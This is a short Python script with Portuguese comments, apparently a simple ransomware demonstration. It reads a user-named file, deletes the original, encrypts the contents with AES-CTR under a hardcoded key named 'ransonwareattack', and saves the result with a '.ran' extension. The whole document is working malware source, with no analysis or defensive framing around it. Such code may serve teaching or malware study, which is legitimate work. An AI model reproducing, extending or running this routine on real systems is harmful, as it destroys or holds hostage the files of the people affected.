import os
import pyaes
import time

## abrir o arquivo a ser criptografado
file_name = input('Digite o nome do arquivo com extensão (padrão: arquivo.txt): ')
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"ransonwareattack"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ran"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

## mostrar mensagem
print('Criptografado com êxito, nome do arquivo: ' + str(file_name + ".ran"))
time.sleep(5)
